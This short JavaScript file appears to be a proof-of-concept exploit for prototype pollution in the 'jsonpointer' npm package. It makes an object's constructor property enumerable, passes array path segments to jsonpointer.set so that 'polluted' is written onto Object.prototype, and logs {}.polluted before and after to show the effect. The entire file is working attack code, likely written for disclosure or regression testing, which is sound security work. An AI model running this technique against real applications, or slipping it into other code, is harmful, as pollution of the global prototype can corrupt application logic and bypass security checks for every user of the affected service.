var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const jsonpointer = require('jsonpointer');
console.log({}.polluted);
jsonpointer.set(obj, [
    ['proto'],
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);